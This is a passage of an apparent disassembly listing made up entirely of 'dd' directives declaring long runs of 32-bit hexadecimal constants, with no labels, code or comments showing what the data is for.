		dd 1A3FACC4h, 96623099h, 0AD5F8940h, 425A607Fh,	24315935h
		dd 0A3169F23h, 13A13E6Fh, 0F28EB7EFh, 0C82DF76Fh, 735727D0h
		dd 0F8B14F41h, 6B510FB1h, 0BF3AA5CEh, 2008E924h, 0D74A039Bh
		dd 3D916AE1h, 65C30D82h, 6666C540h, 0F327813Fh,	0DE612AE9h
		dd 0F4ABA30Dh, 0FE4224C5h, 0FD2B74BCh, 0BC33E03h, 40C27A10h
		dd 84758DCDh, 4C935EF1h, 0E7A6527Ah, 42BB0A91h,	21F90227h
		dd 0F69FCD95h, 626F7DF3h, 0C5FE0594h, 5C1E1F91h, 4A0D6165h
		dd 80D9BED7h, 0F680452Bh, 0F6FE74D3h, 4A38EA4Fh, 0DDE9643Bh
		dd 597A9168h, 0ECA622EAh, 426AAE8Ah, 0D52477C7h, 0B88E60F2h
		dd 0EACE177Fh, 0B0F64C06h, 6181ADD1h, 0D8BA3104h, 7F56C188h
		dd 2FED5A08h, 0BA69A039h, 31D0BE9h, 0DDE0F1F2h,	26581CC6h
		dd 0F7156B3Eh, 0A4F59EE3h, 0DA47C76Dh, 0D74B7481h, 136E3116h
		dd 161517B8h, 7572DFE0h, 572A2773h, 0CFED2D46h,	7B61A931h
		dd 58CEA237h, 0D7409879h, 20B59721h, 0A378A33Ah, 0FC11C935h
		dd 5358EA9Eh, 0AA1EF690h, 0B80EBAD3h, 2D409178h, 0FFD93475h
		dd 0DC8442Eh, 19697726h, 77169BCAh, 5252CDB2h, 6C14C7B2h
		dd 2663BE3Ah, 0FD5688D3h, 8F9BAE01h, 0A575BC7Fh, 0F6F1569Bh
		dd 0AA81E7Dh, 0EE75D167h, 3F4856D1h, 98E0A91Eh,	4CD59392h
		dd 0E0F9390h, 0B0FB6627h, 1A30F1B1h, 47415B7Ah,	0B8690827h
		dd 385906CEh, 39DD267Bh, 0E22A72Eh, 16CFBEB1h, 0BFC853Eh
		dd 0E0B5DBF3h, 0E38215FBh, 2707E794h, 25E18D9Bh, 28FD9CF9h
		dd 2E582D96h, 0B8E0E038h, 0F69AEF79h, 6A15D92Dh, 1CB28A3Ah
		dd 235A9BFAh, 0B8DB7E4Bh, 16DDECA6h, 179F0B9Fh,	0D14E3314h
		dd 0FE905E3Ah, 34A047BEh, 44515BFBh, 0CFF5F3B8h, 0DCCB4D6Ch
		dd 0AE93639Dh, 6E878472h, 0E3F9F59Fh, 2F7B50F7h, 8D0161Ch
		dd 4CC3305Fh, 4EA84E81h, 3F03B419h, 0EB180D8Eh,	0DEB3CC28h
		dd 0EDE77882h, 9AE95E45h, 8C9B8697h, 0F1628C0Dh, 0FD6A9CDDh
		dd 0B68A4163h, 0CE1574Fh, 0C61955F5h, 1A4C81E9h, 0F0E8B052h
		dd 0CB4905C0h, 1D49D92Eh, 8759ABF0h, 91179722h,	0A1BD0C7Bh
		dd 9F4876h, 4E57F936h, 0FE58F8FCh, 0E0173839h, 0F9C4703Ch
		dd 0DEE4DC04h, 9364E45h, 262FE67Bh, 0F575C112h,	0DEE707A1h
		dd 0D9D993CBh, 0A8486753h, 42F72104h, 0FCF095EBh, 0E1681DC3h
		dd 96DD1D5h, 9C1166F7h,	0E01A2F33h, 0FDA6372Fh,	0A5F44F6Bh
		dd 345DFB15h, 0C0123F28h, 5B38162Bh, 910DBD6Bh,	45CABC0Eh
		dd 9491ABA2h, 6C349BFBh, 0A18EEE36h, 5ED8AFE5h,	8DDB1854h
		dd 0CFD367Eh, 71A9117h,	0D13B5974h, 0E35846AFh,	5E9CC167h
		dd 2C4B13B7h, 0FD4B4C73h, 681531CDh, 0EAC8F28Ah, 989FA569h
		dd 8CF8E9CFh, 0FD10DCB8h, 54F92A09h, 5D65F80Bh,	0E08C683Ah
		dd 2728A801h, 0DD6A7E3h, 4197BBD0h, 96D31E4Ah, 48B96900h
		dd 0B3C3F8B3h, 0EA2B2688h, 625931E2h, 0B0D9598Eh, 0AE0240EBh
		dd 3D3E9F84h, 0B87948B0h, 191CC53Ch, 33080F51h,	4536411Eh
		dd 473F94F3h, 7CE394AEh, 0D1030F6Fh, 9586A674h,	0FDB88DD0h
		dd 2FA216BEh, 9DB48F52h, 0DDB5AF37h, 43FCBD44h,	80B35FDAh
		dd 0B17B8221h, 42F6D5A1h, 1AC2FF1Ah, 0F8D4C829h, 767750D7h
		dd 0E9725003h, 0C048F11Ah, 0FA39507Eh, 4E72BDD5h, 6DA87068h
		dd 0B0769E6Ah, 0B2FE47E9h, 3079B9D9h, 1A15080Fh, 0C46F2D30h
		dd 0C87B7BCDh, 0BE484BC2h, 0B37B5905h, 3E49FE8Ah, 7D2B4472h
		dd 6DC3CE39h, 216F5112h, 1A3E5CC8h, 0B5F99B02h,	0ACD23C73h
		dd 957CBC29h, 3EC52478h, 583AA18Ch, 78D6AE91h, 1DC32AF2h
		dd 7DED4C94h, 81EE92EEh, 0D6F09EB9h, 0F2125823h, 3C768F0Eh
		dd 0B32F115Ah, 0D4A1EF88h, 4400DE1Fh, 0D6ADE2C9h, 0EF2A6170h
		dd 7D0A8CB3h, 1A56A6EBh, 0D276BB0Dh, 974FA78Eh,	0BAD90DEh
		dd 0FEE0F549h, 6B4B0482h, 0C1C8B030h, 0FFA8FE2Fh, 4BCAB894h
		dd 83221117h, 0DA92B272h, 5A077681h, 6EF6402Ah,	0F02C80D3h
		dd 0A148370h, 7567132Dh, 90039D62h, 54C4A13h, 0B6FC0A13h
		dd 0ED429790h, 8FC2336Bh, 0DEF8E84Eh, 829E78C8h, 709B0B6Bh
		dd 0A6C76781h, 0EE70160Bh, 8BD9798Fh, 0B40E8004h, 6A4CB52Dh
		dd 0E166F14Fh, 0D45D15F1h, 0F26621A0h, 0A2D58977h, 11B90633h
		dd 0F97D227Eh, 6CF55559h, 0ECCD4FC9h, 3B7027Bh,	509E59B0h
		dd 8FD9CA43h, 0A23FA3C5h, 77A2ECD2h, 54944CB0h,	0CE5F3BDFh
		dd 0F8F893E1h, 5ABE97FCh, 4E26746Ah, 1155DED3h,	0E79CBD91h
		dd 0D53C3D06h, 171E91E4h, 825347B0h, 72C784ACh,	768C51CEh
		dd 11C210B1h, 309D3734h, 1EBF8B2Bh, 0F5863BC3h,	615ED78h
		dd 0D856F209h, 539BD9FFh, 350B2495h, 223BE223h,	0F02B36E5h
		dd 0C14882C6h, 0C2243C8Bh, 4EBA4883h, 25E035FEh, 0FF2818A9h
		dd 0EFD93048h, 0C1F32894h, 1AA4B8E4h, 6C138834h, 13CAAB7Dh
		dd 15248D83h, 0B02E28FCh, 0E11A2835h, 30E0A087h, 3CB11C73h
		dd 80D14862h, 0AB7776A4h, 0AB2F5723h, 3D00B6F2h, 0DA5CF55Eh
		dd 0BE4A5074h, 0E62075E4h, 68DB7EC6h, 0BBB8550Bh, 0B9721A7Eh
		dd 84CAEAB7h, 22999869h, 3FF99304h, 0B9AC5F6Ah,	587FCACCh
		dd 18A545A3h, 2D60CB66h, 0CA2418A8h, 0B51508F3h, 0ECA4BE67h
		dd 0A0BA3F99h, 9B647993h, 0D3CF37B3h, 57BC545Ch, 3CDDED89h
		dd 0CBF75A88h, 0FA2E3E23h, 94B6399Ch, 0C5F1D78Bh, 7FE85DD1h
		dd 0D0E90152h, 0F48F58C4h, 0E814FBEBh, 28FC910Fh, 0DE21B038h
		dd 0C4D86921h, 9C4F3A28h, 5E93BD31h, 0BA03655h,	0AE7E53B1h
		dd 8608315Eh, 41B0E3Ch,	60C767DAh, 58FDC4DCh, 0EC2E513Fh
		dd 6F18B99Bh, 0B3DCB5CBh, 8D72F3E6h, 0EA16FE75h, 0D3569CC9h
		dd 3F2027EBh, 39ACFF4Dh, 0C8987AC4h, 0B946C245h, 870C005Dh
		dd 0AC624178h, 0F76F714Eh, 4BF7C752h, 72C310A2h, 45038E7Eh
		dd 0F501A143h, 13BD90EDh, 0F5F32C44h, 0D565F215h, 9B68D821h
		dd 17B77D52h, 0D796639h, 87CD184Fh, 0DAC8C571h,	5E1C1596h
		dd 0CA59341Dh, 9DDB2E99h, 8F24225Eh, 0F68562D4h, 0FF6049D3h
		dd 3E07F5B2h, 5F0A0D48h, 0C9DA481h, 8433D6CDh, 9BECFAF4h
		dd 0E4F94409h, 0AA541C3Fh, 6C35DB08h, 64D57612h, 0F814056Ch
		dd 0A3BEA07Fh, 229039B6h, 3BA22F7Bh, 6CFA8E62h,	3E56F677h
		dd 3CAC9EF7h, 46E683Bh,	15DE732Ah, 60FA953h, 0C819D594h
		dd 0EA69807Fh, 0CC56410Fh, 97BDFC8Dh, 8E8F6A25h, 26144A6Fh
		dd 556874A4h, 9E03CF58h, 0FA4ADF7Ch, 9B2A0D69h,	88CFA2F2h
		dd 8E4AA768h, 36006FF7h, 0C460694Dh, 2CD366D8h,	4BAA1FBCh
		dd 90736302h, 8A16DE2Bh, 0C01D2971h, 0C44B2E31h, 6E436A14h
		dd 47892A8h, 8337D55Bh,	5D2E885Ah, 0FB6B1BCEh, 0B70CF226h
		dd 9523B334h, 0C1DDC3D4h, 2EF36A7Eh, 0F1BE03A4h, 0F9C50CB8h
		dd 634C35EBh, 9F9FF7E2h, 0CFE5888Dh, 9EFFB0DEh,	0ED6E594Ah
		dd 6871FACh, 0E33CF9BFh, 1647BCC6h, 37DC75CFh, 0FDF05C8Ah
		dd 0A9EC8E59h, 8DD869DDh, 0FBC1F3EBh, 9178E64Fh, 86BE0DDFh
		dd 3F3CFD87h, 0B85A06EBh
		dd 0A996F4BBh, 38A192F1h, 0D2337660h, 6A6C286h,	0DE4410D5h
		dd 0BDF70C6Ch, 58DD4C5Bh, 0A6F9A96Ch, 6076814Eh, 0C9A54D6Ch
		dd 0DEB6ACBBh, 930FAA64h, 3AE0B497h, 5E5B7B27h,	8E64F3BCh
		dd 7A6D184Eh, 333EC25Ch, 1CBEE902h, 0F9D4CE8Ch,	0B9BC4A5Fh
		dd 0E326F38Fh, 972DD84Bh, 0A7B7FC7Ch, 688EE76Ah, 0C81A0F1Bh
		dd 0A4680E78h, 27F1273Ch, 0B640DDA3h, 5AE127C6h, 0B823FF81h
		dd 828482F9h, 0CE9BB2DEh, 4177401Dh, 63AD5A8Fh,	985932BFh
		dd 3EBD225Fh, 21EEDDBEh, 6A7C317Ah, 0D4635320h,	48B10A37h
		dd 0D94E2A8Fh, 0DF24176Ch, 61FDDC3Ch, 7B78D1B9h, 0D4E0400Eh
		dd 595570A0h, 66AA583Dh, 8BEE54DAh, 941ABC57h, 0C06F0BB9h
		dd 0C0701976h, 0C049BCACh, 0D0B92DF4h, 46E8601Fh, 77D7527Ch
		dd 0CAAA3BEAh, 51316B11h, 52F4C6C5h, 3D84E4C0h,	0F0D93CA3h
		dd 0CE45D6C8h, 0DB3F3341h, 1BDC7536h, 0EE53489Bh, 8A26079Ch
		dd 6869407Dh, 43E6E5A6h, 0CF2C934Fh, 94703ACEh,	80A9030Ah
		dd 2F3753F9h, 0BAD9B7A6h, 0C7F3ECA1h, 174861BAh, 58762h
		dd 0B30D9DC0h, 2497B39Eh, 9D53EF05h, 0BBE74558h, 3F00E412h
		dd 9F2A484Dh, 4E201B2Fh, 5CAE3083h, 4D85CAFFh, 8701D5C4h
		dd 0EDDD4308h, 0E66DCC78h, 674F6761h, 7004F6D6h, 0DB968750h
		dd 274CCD53h, 287BDCEEh, 6537955Fh, 236FADB7h, 8C28D0DBh
		dd 0D08D370Fh, 0A6B7BCD8h, 0A0E05E4h, 6CC60AB1h, 0E88F654h
		dd 26350CB5h, 725F2A78h, 0F73EE3C8h, 0D42647B1h, 60E7D47Dh
		dd 98AD1F4Ah, 1BBFFF99h, 3E05C5EDh, 805CF6B9h, 0C3C41B73h
		dd 0C34B5C0Fh, 0B04ECCh, 0FB7E2613h, 0E1337630h, 8FBA801Ah
		dd 4D38AD3Ch, 6FC9AEF9h, 0FC8A7895h, 0F12CB85Fh, 4737B38Fh
		dd 3438489Ah, 804EFACEh, 4D96CDDCh, 1FF0067Bh, 0B39A73AFh
		dd 0AF70CCDEh, 6138BF36h, 70C01E02h, 552A4F71h,	2C115AF8h
		dd 0D9652825h, 0AA59742h, 5302B531h, 2C114D66h,	0A8A30914h
		dd 0A82E7C9Fh, 0AAD99F43h, 4B2C7BC2h, 5AA0CBAEh, 63140674h
		dd 69E527D4h, 0DDC89C57h, 4FD5E78Bh, 0D25A5DB5h, 0BA029BEh
		dd 0D85B4E36h, 1A71EA6Dh, 386DCD8Fh, 76CDD049h,	1B6813E0h
		dd 111F1219h, 0AEC69C9Eh, 0CB80F7FDh, 0F4C34C2h, 0BF9EA5D6h
		dd 0DFB27091h, 0DB407B8Bh, 85002BBCh, 4523F9BEh, 4C3534C7h
		dd 4AD2B3AEh, 4A62235h,	12037716h, 238E298Bh, 82607E5Bh
		dd 8BC9482h, 6322BFD8h,	0E674B710h, 6169347Eh, 839E34D1h
		dd 0A0537211h, 1FA7B309h, 4EF6C525h, 1FF9DA7h, 8E521DEEh
		dd 0AEF62B1Eh, 9659F16Bh, 6D59F8E7h, 9C4165E1h,	868BAF4Bh
		dd 702FE30Ch, 8E381D5Ah, 18B44FECh, 5872826h, 8EDE4CFEh
		dd 43578BDh, 8C57FA28h,	0B7D7180h, 3BFBBE5Ah, 1C14B79Ah
		dd 0EAF6ADA0h, 0F6629E4Ah, 0D1DEDD26h, 5B69080Ah, 55E81A5Eh
		dd 1C4DE7A5h, 1A70938Fh, 0C8218DEh, 0CD102A92h,	14A656CBh
		dd 552CBE6Fh, 100B595Bh, 1DC56FB6h, 0C14F1ABBh,	0D99BBC8Ch
		dd 9118967Dh, 0DFC0256Bh, 9AFFB0B2h, 0FB408AE7h, 0AC1B3BC2h
		dd 0B31222D2h, 3F3B3F30h, 786688D2h, 0A6552089h, 2C23AD51h
		dd 1D5112E2h, 0A28B4466h, 1E8B0102h, 804E321h, 0ADE16B18h
		dd 5AF41DB7h, 0AD6316EBh, 0A068EDB2h, 4A061DFBh, 0AD8E8B72h
		dd 0F1CE2E15h, 91B427E9h, 12B34CDh, 0D19FB397h,	0A80368BDh
		dd 2F264C80h, 2ED6381Bh, 0EE344C4Dh, 0BE9F2916h, 0D10B4F08h
		dd 8035702h, 61AC4163h,	0D276711Ah, 0BFBB3B07h,	970066DEh
		dd 469D693Dh, 1EE946B6h, 87FB331Ch, 0C211F29Bh,	3280B87Eh
		dd 5F1BA98Eh, 2147DA84h, 0E88430FBh, 9B8D53AFh,	0D71CFFF0h
		dd 8CA7F8D9h, 98383DBh,	0AE6D811Fh, 0D997F974h,	0F1892171h
		dd 35D26055h, 0F2E0CFF8h, 0E7DCC0BEh, 0F623F391h, 0A1A158Eh
		dd 91165F49h, 0EEC61842h, 6E79163Eh, 680AF26h, 0C559A761h
		dd 38446C4Ah, 0A68A4D2Fh, 753B6C56h, 0E1E3DAD0h, 821E14F8h
		dd 0AB5F7C1Dh, 0A5BBAA03h, 4F9B193h, 0C07DE264h, 0BD9C872Ah
		dd 8A34917Bh, 2181F3E4h, 99B663EDh, 1B70BF4Bh, 8C967777h
		dd 0EAC4F0E4h, 49DEE4Ah, 7A94D524h, 0FD6CECDDh,	0DD5031ECh
		dd 54BCCB8Fh, 64AE8614h, 0B7925CF5h, 40D0EA77h,	2828C639h
		dd 3E8497AEh, 645FBCD9h, 66DFE08Bh, 730384A4h, 0C5E07DD7h
		dd 33FBC266h, 6B3CD6Fh,	905307EFh, 8719835Fh, 38DEFE70h
		dd 71A70509h, 11805A08h, 0ED1ED848h, 0D2998AF1h, 7F998582h
		dd 0AF9EFB24h, 331A15BDh, 19A45571h, 71BF72C2h,	903683C7h
		dd 5B73A61Ch, 0A98AA1A9h, 365F682Eh, 917D0D4Ah,	1F2B086Fh
		dd 71D13A0Dh, 84539D9h,	0E01FDE87h, 36905840h, 5C589B84h
		dd 0E757ACEh, 0AB56B8D5h, 11E53692h, 460CEF04h,	0EFEE4658h
		dd 5BA65931h, 0F56A6CC8h, 0A626308Fh, 327FCF9Eh, 0FE8474F4h
		dd 454883F1h, 0DA956E1h, 0AF908Fh, 965CA13Ah, 0D8E36613h
		dd 570F99C3h, 3D2769B2h, 22B1F710h, 31517FACh, 5D05842Fh
		dd 0C01D8DB4h, 4E49BBE5h, 0CB5A2F4Ah, 64A104ADh, 0F6A2F5F8h
		dd 325D772h, 60CF0F87h,	7B7D5491h, 91496107h, 0D7C98D12h
		dd 935BD7A8h, 837A3E94h, 14A19C6Ch, 358340B2h, 0B49E583Dh
		dd 5D6DD889h, 2768A4BEh, 1F2D22DAh, 0CF1D28Ch, 0F600085Dh
		dd 0B57F9D43h, 5AA3A5EEh, 33D07F45h, 7CB20B44h,	0F60D897Bh
		dd 0D9D03534h, 0E06AE959h, 135B5F43h, 0F7A7376Bh, 5AF9D7ADh
		dd 63708913h, 52741888h, 0A09B8B0Eh, 79F302E9h,	8E216527h
		dd 57B1CB47h, 0DA88385h, 422E1894h, 496636A9h, 9BAE263Ch
		dd 0DC6B7DD1h, 0E6406FE0h, 37BD07CEh, 0EC77AA93h, 9C3C4F46h
		dd 0C1B7E488h, 7CEB2A60h, 0B8C566B4h, 48F2AC46h, 0A62FCDDAh
		dd 8082296Eh, 0C3985389h, 55523CFAh, 0B40020DCh, 0B1864376h
		dd 9C8504A4h, 28613194h, 0F22A9084h, 0CFEBC346h, 0F914CF2Ch
		dd 431ECD8Ch, 1B3E0C5Fh, 6511A8E7h, 550CAD5Fh, 22E35F0Ch
		dd 0F2283A34h, 89304E4h, 51A87F98h, 809EF382h, 0AC18375Ah
		dd 0A91C49FAh, 9659416Eh, 36D1FEACh, 0E91C2CD9h, 904CE65Ah
		dd 9530F2ABh, 505305BBh, 0F64621D4h, 0C99B5508h, 52C8BA71h
		dd 0BEBE638Fh, 22640D9Fh, 52AA53CCh, 4F984D20h,	0A952B702h
		dd 0D902BFF7h, 2ED237h,	7562E6DFh, 5A413234h, 4B526915h
		dd 26392EFAh, 0AF8AC897h, 0FAC24138h, 364C2BF3h, 45C3C975h
		dd 0F777B6B3h, 0F187343Eh, 14598BF1h, 14C1BAF2h, 3C6E4347h
		dd 7D24E9A6h, 500F6889h, 1AEE3E3Eh, 5A2CC4Ch, 0A12D7394h
		dd 76F76049h, 39A83CEAh, 0D9AEC213h, 5E563812h,	37173898h
		dd 7E6F195Dh, 697530D4h, 8A09B5B5h, 37C5BE88h, 0B3D4E3DBh
		dd 35C79B6Fh, 0A1D854D5h, 0DD39C4BCh, 0CF96860Ch, 7DBD0DA7h
		dd 0B3C29A03h, 1A242119h, 0D153E59Ch, 6C2B1AC2h, 0EBEC1240h
		dd 86DA70CFh, 97489905h, 0D8D11AB4h, 0A29F4906h, 0F0919DDAh
		dd 0E4AAF1E9h, 6E3E92Bh, 44AE693Ch, 0DB11D152h,	7CF935D7h
		dd 7B75B95Ch, 0A993CC90h, 7CA0ABA5h, 95E0A3F5h,	5005B751h
		dd 0E7E04AA9h, 0C7C26008h, 28F6ED66h, 36A61C93h, 0FE1F9A10h
		dd 0B499B826h, 0C1634302h, 3DA83AC0h, 0B712588Ch, 5D896436h
		dd 3B95794Fh, 0FE2F469Ch, 76C31292h, 9AB792FEh,	444C38FAh
		dd 5BFEAF0Eh, 8EBB6026h, 594EAD26h, 6A628607h, 37DF6C7Dh
		dd 12F463FBh, 62BC33EDh, 0C63194Dh, 0E4CECA0Dh,	0A3C48F01h
		dd 9E85C2A1h, 0C0426Dh,	2C30FF74h, 0E6C5304Dh, 44F561D2h
		dd 1A967D27h, 841A384Bh
		dd 609B93ABh, 62BB5C22h, 9921C733h, 0B73AA177h,	0A0AE71C4h
		dd 7226FAD8h, 0BCC811B5h, 490569F2h, 69BEA428h,	900445FEh
		dd 2500EA68h, 3DB8BF17h, 5AC7BCE8h, 7B43F4EEh, 0DB384286h
		dd 0C4B332E3h, 21DD1B4Ah, 224FC7F8h, 54B317CBh,	26FE9C5Bh
		dd 21F8B7A6h, 7D369558h, 9A8D37B7h, 73A839EAh, 13A603A0h
		dd 0C334FD33h, 420181DCh, 4E4A712Eh, 86478266h,	34E6E2F5h
		dd 0EBF89732h, 5C44C54Ah, 0A3B52F65h, 0DE981710h, 6EA40AE6h
		dd 3FD513A4h, 3DCDC8B1h, 0E316609Ah, 99AB224Ah,	0E7C04C88h
		dd 0D3FF445h, 0BF5398E6h, 18DA8F7Fh, 0DD53139Ah, 0B14A3FFDh
		dd 4689B417h, 95BA7B87h, 28A26F6Dh, 0CC08FB36h,	9517F958h
		dd 73692DB0h, 8001A936h, 2CFE3557h, 80DBEE62h, 0AE0E3B8Bh
		dd 0EB3C52E8h, 0DCD3F9A9h, 9CE8004Ch, 751E2F90h, 0E97F2F2Eh
		dd 670764EBh, 31C61A94h, 8A6EA44Eh, 7FA9BC3Ch, 90165A4Ch
		dd 6F4882E8h, 3F0C9821h, 0E61897Bh, 0EB295D62h,	28B02248h
		dd 61EC729Ah, 80729E4Dh, 0E2E7C067h, 0E60322A0h, 80AF904Ch
		dd 0C67D9C74h, 0A25E817Bh, 3ED64707h, 82E150B2h, 81B5682Bh
		dd 75B5E4E9h, 0C4DA1EE2h, 9AF7CDACh, 0F00190BEh, 1D7D2986h
		dd 0C0DBBD37h, 0FE0A7C8h, 0B30500BCh, 296F4B76h, 30F21F19h
		dd 0E60ACDDEh, 0F0BE2028h, 7499CCA0h, 0AB82FBB6h, 0A41C115h
		dd 57573232h, 0CAF1E1EFh, 0E232B38Fh, 9B5EDBB8h, 0BBAC2728h
		dd 0C8BD3613h, 158491F3h, 0F2539BB6h, 464B7A5h,	0C7642532h
		dd 0B12FEB1Bh, 77CF04DDh, 0D77BAEFAh, 2BF5858Dh, 10D3AAE8h
		dd 0E90EF83Ah, 97F4E677h, 0EFDBF820h, 69316DD1h, 3F31093h
		dd 0BA095EDBh, 6DC4CC88h, 0D7FC08F1h, 4B3B0639h, 84D17ED3h
		dd 18225DB2h, 0E9E5A2AFh, 5C572045h, 0ADA743C3h, 3311038Fh
		dd 5386D211h, 0D455C779h, 8A2C1C5Fh, 0FE785E9Ch, 0BC600790h
		dd 0E73AABBFh, 0E011F0B7h, 0CA157043h, 340482DCh, 0E61B87C7h
		dd 0DB4746C1h, 8EF45ECh, 1159B3BCh, 0E02154FDh,	1FC67C9Ah
		dd 0BEB5BB64h, 63250EF9h, 2AC9F7F7h, 92E63FA9h,	729E388Ch
		dd 5E42FECCh, 9CF86494h, 0D4501000h, 30B65CBAh,	610AC449h
		dd 657E52A8h, 0EA3B7F2Eh, 6EAD2897h, 5589A327h,	0F5C0E49Fh
		dd 47DF4487h, 62D12688h, 0F2FE91D1h, 0D334C4A1h, 0ECB06CB7h
		dd 0E4B01F62h, 46A8B08h, 2E25FF81h, 4038CF60h, 76FE0B39h
		dd 45429577h, 0B38CA5A6h, 0C2AF0F66h, 9CDD6D4Fh, 2FA4CC38h
		dd 12CA318Eh, 0FB6577BFh, 2E407EEFh, 535B9FE9h,	9107FE0Dh
		dd 1E82FB0Fh, 822CB14Ch, 27DC65C2h, 2D54DB50h, 9B6BA795h
		dd 6CB288EFh, 0AAC971B1h, 50DB4E40h, 0AA0F633Bh, 873FDC45h
		dd 0A0C3A6ADh, 88E776B2h, 2228060Eh, 0C0386959h, 7AF9B792h
		dd 0D2E60A7Bh, 0FBBB09A8h, 0D199AADDh, 6A6B5D8Ch, 0AD61EAB2h
		dd 9A50F46Fh, 0CBFAD08Fh, 0E0EA86EFh, 2D721DAFh, 0C817EB57h
		dd 144BD082h, 5CD051DEh, 7039498h, 1F1AE2B7h, 76FD5DE6h
		dd 93ADC6Eh, 0FE7AAD13h, 20EF6838h, 42E926A5h, 8421761Ch
		dd 0F2DE0E66h, 5FF75463h, 37E332B5h, 937B2C9Ah,	7608BEEBh
		dd 0E3E13F0h, 1C6242D5h, 7733F5CDh, 125BE02Bh, 328F78Bh
		dd 0DC64C6C7h, 7897D5F6h, 7DF80731h, 0DFC46B8Ah, 0A00614D7h
		dd 0FE39127Fh, 91D722Bh, 7D9C922Dh, 121065E1h, 4B81811Bh
		dd 5A3733E6h, 0E9EFC460h, 63A8101Fh, 3C4AFE29h,	429763DCh
		dd 0F0FD1FC1h, 362FF800h, 0F779508Eh, 5A3CFE1Eh, 15848201h
		dd 33E359FFh, 91D7917Bh, 4AEA0229h, 5719A400h, 377C088Dh
		dd 952DB34Ch, 0DB801DE9h, 3D87B752h, 4F040D0Bh,	3850A765h
		dd 5CA69E4Bh, 12293D49h, 3A7CD34Ch, 0B2F5930Eh,	0A0E4A760h
		dd 2089744Bh, 60C46F36h, 5BD39E68h, 7A3F7599h, 0E5D84A6Ch
		dd 7A65F848h, 6C29C1E1h, 0B40DE88Ah, 0EB14CFDCh, 6A17E2E3h
		dd 603FA469h, 133F6626h, 12472AD2h, 735F918Ah, 0FA95441Bh
		dd 0A82C4557h, 3A2E2B16h, 6FFEEA36h, 0B16E13C7h, 83749500h
		dd 7D454A41h, 31E9D994h, 9C331E0h, 3152B822h, 0B3FF859Fh
		dd 0A1BF2C31h, 9B68E931h, 1D9D4140h, 41F27092h,	0E2F1FF89h
		dd 2A1402BCh, 0A9DEDC8Fh, 56ED6EECh, 0DC35FD58h, 44485654h
		dd 5B0228ECh, 774BD6AFh, 0EF5C1C70h, 0D1868CCCh, 93ECCE87h
		dd 0B7054DA9h, 0A5D83BE4h, 3A3F20A5h, 2611066Eh, 9D7ADDF4h
		dd 996ECF6Ah, 119C3C67h, 43B7EE38h, 54DC2C81h, 53CC3F6Ch
		dd 651682CDh, 0E8CCC4F5h, 89B1ACE5h, 55479DFFh,	99925E36h
		dd 0FDC87001h, 6A16D829h, 0EC55ECCAh, 6B402857h, 0BACA0118h
		dd 0CB10559Fh, 0B598054Ch, 0C3B06853h, 0B799D7E6h, 1185B564h
		dd 4D4CEDFDh, 753CF437h, 3BFCDA6Dh, 2CC6C2A5h, 0E36798FCh
		dd 0D368D722h, 0CD7CF845h, 36F1615Bh, 8EC03DDEh, 0A13F8621h
		dd 14A93762h, 5E895678h, 0F3364DDBh, 345E4041h,	0A2CA5AA9h
		dd 0FFE964AEh, 928785D7h, 663500A5h, 5CCB2DC7h,	5157FA99h
		dd 0AF361C89h, 9E7EEF3Bh, 0BA881446h, 61E3D200h, 5B039FF8h
		dd 3F534490h, 79760DCh,	7C6BA2ECh, 0BC726CCFh, 57B521F1h
		dd 0D0A4015Eh, 0F276CD76h, 0DEDBBA8Ch, 0B03D5F77h, 0FDE28CD9h
		dd 8C6F1FA0h, 0CB427CAEh, 0A0B10D57h, 5D049324h, 1F1B16D1h
		dd 0AC054515h, 0CBFC059Ah, 0C768B57Dh, 86573FAAh, 9F66F19Ah
		dd 6AFC9A5Ch, 4DB7033Fh, 6340E19Ch, 1E0B228Ch, 5930DE61h
		dd 2E6D5CF2h, 17A0ED49h, 0F4074175h, 9095A977h,	863FA54Ch
		dd 8839815h, 0D46EF5F7h, 0A3319DA9h, 45A1A6A4h,	64470A39h
		dd 73EC9B85h, 4E5982Ch,	2F318FCFh, 2C777F87h, 4B041A5Fh
		dd 5F814361h, 0A9D91574h, 4B1CC71Dh, 2CD471A4h,	3AABFD4Eh
		dd 0E921FA7Eh, 0AC3EF219h, 57683B4Eh, 53143EB5h, 93982861h
		dd 0E704E097h, 0A23677C8h, 1BD0BDh, 0DC256F9Ah,	54063279h
		dd 0CB8CCCC4h, 0D65CB471h, 1ACF6ED9h, 590D926Ch, 13EE6DB4h
		dd 9CB3EAEDh, 18477304h, 1B7C4E93h, 0B1996614h,	4BCE3A92h
		dd 644E619h, 0FE29270Ch, 0D0AEF962h, 738E9399h,	2425B18Eh
		dd 5F5954CAh, 0E78866D1h, 0B374A9C4h, 577AEF5Ch, 791F25D7h
		dd 0FAB880E7h, 0AA9A33E4h, 39D027BEh, 77A7658Dh, 73CF132Fh
		dd 0FC54A287h, 0FAD6237Fh, 0D8F62B5Fh, 0DEF18211h, 0C7801C09h
		dd 99E7479Dh, 0FB78CBE0h, 3159DBCCh, 0DA268B19h, 0A7B25DBEh
		dd 9A7F200Eh, 0F9FA1CCBh, 9A431A44h, 483B0006h,	0A07C7083h
		dd 0D26A4640h, 0AD2BB9Eh, 3B070212h, 158DC10Ah,	420042B4h
		dd 0C385128h, 806971CFh, 0D5F774FBh, 0B776845h,	0A555F041h
		dd 0B890ACB9h, 0DC35E296h, 22F57F9Bh, 5E71A09Eh, 0A1B3BBDh
		dd 5B814FAEh, 0C10B7E7Eh, 0F7EDA05Eh, 0B454C179h, 0BD8BEC7Bh
		dd 4C7EE3DDh, 0D150118Bh, 0C29142DBh, 2BA6C922h, 0CEE2294Dh
		dd 0ED2D498Eh, 0FFF7D37Fh, 0A3C2D66Ch, 0D1387BA7h, 0E97A710h
		dd 9A2839EEh, 1D6C88A6h, 60ECBF63h, 1FB2ACB9h, 0ACE6AA68h
		dd 8ECD65A3h, 32551C04h, 9277EB51h, 0C9991D7Eh,	0FC3CA877h
		dd 7016066Dh, 0A84D998Ah, 828FDB34h, 7B279A06h,	2D6E4B20h
		dd 0BDA01DA0h, 9C773BA9h, 3704D754h, 0FD5C23E3h, 7B540257h
		dd 0B4A2E1A8h, 75E7F10Dh, 0FA7532FEh, 6B465B9Eh, 94B90E3Bh
		dd 0CC2D8DB8h, 0B13C6107h, 0D48358D0h, 1B430776h, 0F46A3A06h
		dd 1B96BAE2h, 0EA1C0DA3h, 0B7ACD138h, 0E9B3C9ABh, 0A510B998h
		dd 275BE934h, 703EBF79h, 209251D1h, 97BBC90h, 0B7153Bh
		dd 824A9A51h, 4D53F026h
		dd 0D8606C3Eh, 9243A165h, 2B595FABh, 9A1D6F88h,	6D767339h
